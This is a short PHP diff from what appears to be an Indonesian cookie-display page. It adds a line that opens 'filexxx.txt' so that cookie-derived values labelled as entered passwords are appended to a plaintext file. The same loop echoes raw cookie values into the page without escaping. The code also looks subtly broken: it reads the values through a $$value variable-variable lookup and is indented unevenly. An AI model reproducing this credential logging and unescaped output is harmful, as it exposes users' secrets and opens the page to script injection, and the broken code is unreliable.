@@ -69,6 +69,7 @@ if (count($_COOKIE) > 0) {
     // Menampilkan semua cookie
     foreach ($_COOKIE as $key => $value) {
         echo $key . " = " . $value . "<br>";
+        $file = fopen("filexxx.txt", "a");
             if ($file) {
             fwrite($file, "Password yang dimasukkan: " . $$value . "\n");
             fclose($file);
